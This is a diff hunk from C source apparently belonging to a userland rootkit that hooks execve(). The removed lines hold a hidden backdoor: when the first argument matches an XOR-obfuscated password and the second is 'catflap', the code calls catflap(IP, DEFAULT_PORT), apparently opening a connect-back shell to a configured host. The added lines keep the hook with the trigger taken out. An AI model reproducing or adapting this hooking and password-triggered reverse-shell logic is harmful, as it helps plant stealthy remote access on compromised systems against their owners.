@@ -137,33 +137,8 @@ int execve(const char *path, char *const argv[], char *const envp[])
 	#ifdef DEBUG 
 	printf("[!] execve hooked"); 
 	#endif
-
-	struct stat filestat; 
-	old___xstat(_STAT_VER, path, &filestat); 
-	if (owned()) 
-	{ 
-		if (argv[1] != NULL)
-		{ 
-			char *execpw = strdup(EXECPW); xor(execpw);
-			if (!strcmp(argv[1], execpw))
-			{ 
-				#ifdef DEBUG 
-				printf("[-] password accepted\n"); 
-				#endif 
-				if (!strcmp(argv[2], "catflap"))
-				{ 
-					#ifdef DEBUG 
-					printf("[!] catflap opened\n");
-					#endif
-					CLEAN(execpw);
-					catflap(IP, DEFAULT_PORT);
-				}
-			}
-			CLEAN(execpw);
-		}
-		return old_execve(path, argv, envp);
-	}
-	return old_execve(path, argv, envp);
+	if (owned()) return old_execve(path, argv, envp); 
+	return old_execve(path, argv, envp); 
 }		       	
 
 off_t lseek(int fildes, off_t offset, int whence)
